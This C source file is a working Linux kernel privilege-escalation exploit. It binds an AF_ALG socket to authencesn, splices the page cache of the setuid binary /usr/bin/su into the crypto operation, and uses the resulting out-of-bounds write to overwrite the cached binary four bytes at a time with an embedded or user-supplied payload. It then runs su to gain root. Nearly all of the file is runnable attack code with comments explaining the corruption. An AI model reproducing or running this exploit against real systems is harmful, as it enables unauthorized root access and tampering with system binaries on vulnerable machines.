#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <linux/if_alg.h>

void send_chunk(int sock_fd, int su_fd, int offset, unsigned char* chunk) {
    unsigned char data[8] = {'A', 'A', 'A', 'A'};
    memcpy(data+4, chunk, 4);

    struct iovec iov = { 
        .iov_base = data,
        .iov_len = 8,
    };

    // Obligatory C socket message handling
    union {
        char buf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
        struct cmsghdr align;
    } msg_u;
    memset(msg_u.buf, 0, sizeof(msg_u.buf));

    struct msghdr msg = {
        .msg_control = msg_u.buf,
        .msg_controllen = sizeof(msg_u.buf),
        .msg_iov = &iov,
        .msg_iovlen = 1
    };

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(4);
    uint32_t op = 0; 
    memcpy(CMSG_DATA(cmsg), &op, 4);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(20);
    unsigned char iv[20] = {0};
    iv[0] = 0x10;
    memcpy(CMSG_DATA(cmsg), iv, 20);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(4);
    uint32_t assoclen = 8;
    memcpy(CMSG_DATA(cmsg), &assoclen, sizeof(uint32_t));

    if (sendmsg(sock_fd, &msg, MSG_MORE) == -1) {
        perror("sendmsg");
        return;
    }

    // Pipe Splicing
    int pipefds[2];
    pipe(pipefds);
    puts("Creating pipe...");

    loff_t su_offset = 0;
    splice(su_fd, &su_offset, pipefds[1], NULL, offset + 4, 0);
    
    splice(pipefds[0], NULL, sock_fd, NULL, offset + 4, 0);

    // Trigger Corruption
    /*
     *  '''
        this SHOULD error on purpose, see this explanation adapted from original authors:
            1. recv() triggers the decrypt operation.
            2. Inside authencesn, the kernel reads the ESN bytes from the AAD and writes seqno_lo at dst[assoclen + cryptlen].
            3. The scatterwalk crosses from the output buffer into the chained page cache page.
            4. Four bytes are written to the kernel's cached copy of /usr/bin/su.
            5. The HMAC is computed over the rearranged data and fails.
            6. The kernel reads seqno_lo back to restore the AAD, but the original bytes at the tag position are never restored.
            7. recvmsg returns an error and the page cache is corrupted.
        '''
    */
    char junk[256]; 
    if (recv(sock_fd, junk, 8 + offset, 0) == -1) {
        if (errno == EBADMSG) {
            printf("expected error: %s @ offset = %d\n", strerror(errno), offset);
        } else {
            perror("unexpected recv error");
        }
    }

    close(pipefds[0]);
    close(pipefds[1]);
}

int main(int argc, char** argv){
    // To generate, run:
    // gcc -c payloads/shellcode_x64.S
    // objcpy -O binary shellcode_x64.o payload_x86.raw
    // xxd -i payload_x86.raw > payload.txt
    unsigned char default_payload[] = {
        0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
        0x47, 0x4e, 0x55, 0x00, 0x02, 0x00, 0x01, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0,
        0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    unsigned char* payload = default_payload;
    size_t payload_len = sizeof(default_payload);
    int is_alloc = 0;

    // For user defined [path/to/payload]
    if (argc > 1) {
        FILE* payload_fptr = fopen(argv[1], "rb"); 
	    if (payload_fptr == NULL) {
    		perror("IO ERROR: File does not exist.\n");
	    	exit(1);
	    } else {
	    	fseek(payload_fptr, 0, SEEK_END);
		    long fsize = ftell(payload_fptr);
		    fseek(payload_fptr, 0, SEEK_SET);

		    if (fsize > 0) {
                unsigned char* buff = malloc(fsize);
                if (buff) {
                    if (fread(buff, 1, fsize, payload_fptr) == (size_t)fsize) {
                        payload = buff;
                        payload_len = (size_t)fsize;
                        is_alloc = 1;
                    } else {
                        free(buff);
                    }
                }
                fclose(payload_fptr);
            }

        }
    } 

    // Read setuid binary file descriptor 
	FILE* fptr = fopen("/usr/bin/su", "r");
    if (fptr == NULL) {
        perror("fopen");
        return 1;
    }
    int su_fd = fileno(fptr);
    printf("Opened \'/usr/bin/su\' with fd=%d\n", su_fd);

    // setup algif_aead socket and bind to authencesn

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };

    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }
    puts("Created sequential packet socket with crypto algorithm address family");    

    if (bind(sock, (struct sockaddr*) &sa, sizeof(sa)) == -1) {
        perror("bind");
        close(sock);
        return 1;
    }
    puts("Bound socket to authecesn(HMAC(SHA256), CBC(AES)), algo type is authenticated encryption with associated data");

    // C autopads with 0s
    unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    setsockopt(sock, SOL_ALG, ALG_SET_KEY, key, sizeof(key));

    puts("Set socket level option: key = ");
    for(int i = 0; i < 40; i++) {
        printf("%02x", key[i]);
    }
    putchar('\n');

    int authsize = 4;
    setsockopt(sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &authsize, sizeof(authsize));

    puts("Set socket level option: AEAD length = 4 bytes");
      
    // Grab connection
    int sock_fd = accept(sock, NULL, 0);
    if (sock_fd == -1) {
        perror("connect");
        close(sock);
        return -1;
    } 
    puts("Connection Established");

    for (int offset = 0; offset < (int)payload_len; offset += 4) {
        int type;
        socklen_t type_len = sizeof(type);
        getsockopt(sock_fd, SOL_SOCKET, SO_TYPE, &type, &type_len);
        printf("Sending 4B payload chunk to: socket.socket, fd=%d, family=%d, type=%d, proto=0\n", sock_fd, sa.salg_family, type);
        unsigned char chunk[4];

        size_t remaining = payload_len - offset;
        size_t bytes_to_copy = (remaining < 4) ? remaining : 4;
        memset(chunk, 0, 4);
        memcpy(chunk, payload + offset, bytes_to_copy);
        send_chunk(sock_fd, su_fd, offset, chunk); 
    }

    // run setuid binary after corrupting it
    puts("Corruption complete! Becoming root now...");
    system("su");

    if (is_alloc) {
        free(payload);
    }

    close(sock);
    return 0;
}
